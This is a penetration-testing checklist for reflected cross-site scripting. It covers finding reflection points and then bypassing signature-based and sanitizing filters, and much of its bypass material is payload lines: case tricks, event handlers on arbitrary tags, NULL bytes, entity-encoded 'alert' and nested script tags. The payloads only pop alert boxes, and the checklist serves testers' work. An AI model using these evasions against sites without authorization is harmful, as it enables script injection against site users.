# Reflected XSS

- [ ] Choose a unique arbitrary string that does not appear anywhere within the application and that contains only alphabetical characters. Submit this string as every parameter to every page, targeting only one parameter at a time (Note that both GET and POST requests need to be tested).
- [ ] Monitor the application’s responses for any appearance of this same string.
- [ ] Submit the follwing payload `'';!--"<XSS>=&{()}` where reflection was detected. Check which characters gets encoded or truncated. If there is a filter in place, try to detect what signature it is using.
- [ ] Determine the reflection context. For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.

# Bypassing Signature-Based XSS Filters
- [ ] Starting with the opening tag name, the most simple and naive filters can be bypassed simply by varying the case of the characters used: `<iMg onerror=alert(1) src=a>`
- [ ] Going further, if you modify the example slightly, you can use arbitrary tag names to introduce event handlers, thereby bypassing filters that merely block specific named tags: `<x onclick=alert(1) scr=a>click here</x>`
- [ ] In addition, you can insert NULL bytes in any position. Note: The NULL byte trick works on Internet Explorer anywhere within the HTML page. Liberal use of NULL bytes often provides a quick way to bypass signature-based filters that are unaware of IE's behavior. `<[%00]img onerror=alert(1) src=a>`
- [ ] Several characters can replace the space between the tag names and the first attribute name:
```
<img/onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
<img """><script>alert("alert(1)")</script>">
```
Note: even where an attack does not require any tag attributes, you should always try adding some superfluous content after the tag name, because this bypasses some simple filters: `script/anyjunk>alert(1)</script>`
- [ ] Attributes can optionally be delimited with double or single quotes or, on IE, with backticks:
```
<img onerror="alert(1)"src=a>
<img onerror='alert(1)'src=a>
<img onerror=`alert(1)`src=a>
```
Switching around the attributes in the preceding example provides a further way to bypass some filters that check for attribute names starting with on. img src='a'onerror=alert(1)> By combining quote-delimited attributes with unexpected characters following the tag name, attacks can be devised that do not use any whitespace, thereby bypassing some simple filters: `<img/onerror="alert(1)"src=a>`
- [ ] Within the attribute name and value, you can use the same NULL byte trick described earlier.
```
<img onerror=a[%00]lert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>
```
You can also HTML-encode characters within the value: `<img onerror=a&#x6c;ert(1) src=a>`
Because the browser HTML-decodes the attribute value before processing it further, you can use HTML encoding to obfuscate your use of script code, thereby evading many filters.
- [ ] It is also worth noting that browsers tolerate various deviations from the specifications, in ways that even filters that are aware of HTML encoding may overlook. You can use both decimal and hexadecimal format, add superfluous leading zeros, and omit the trailing semicolon.
```
<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
```

# Beating HTML Sanitizing Filters
- [ ] When you encounter this defense, your first step is to determine precisely which characters and expressions are being sanitized, and whether it is still possible to carry out an attack without directly employing these characters or expressions. For example, if your data is being inserted directly into an existing script, you may not need to employ any HTML tag characters.
- [ ] So, if <script> is being stripped from your input, you should try the following to check whether all instances are being removed: `<script><script>alert(1)</script>`
- [ ] In this situation you should also check whether the sanitization is being performed recursively: `<scr<script>ipt>alert(1)</script>`
